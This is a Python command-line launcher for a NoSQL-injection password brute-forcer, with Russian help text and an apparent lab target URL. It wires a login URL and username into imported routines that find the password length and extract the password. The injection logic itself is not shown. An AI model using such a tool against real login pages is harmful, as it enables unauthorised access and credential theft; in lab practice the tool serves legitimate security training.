import argparse
from bruter.core import NoSQLiBruter
from bruter.utils import info, success

def cli_entry():
    parser = argparse.ArgumentParser(description="NoSQL Injection Brute Forcer by Red Team Operator")
    parser.add_argument("--url", required=True, help="URL для POST-запроса, например http://10.10.230.141/login.php")
    parser.add_argument("--username", required=True, help="Имя пользователя для брутфорса")
    
    args = parser.parse_args()

    bruter = NoSQLiBruter(args.url, args.username)

    bruter.find_password_length()
    password = bruter.brute_password()
    success(f"Завершено. Пароль: {password}")

if __name__ == "__main__":
    cli_entry()
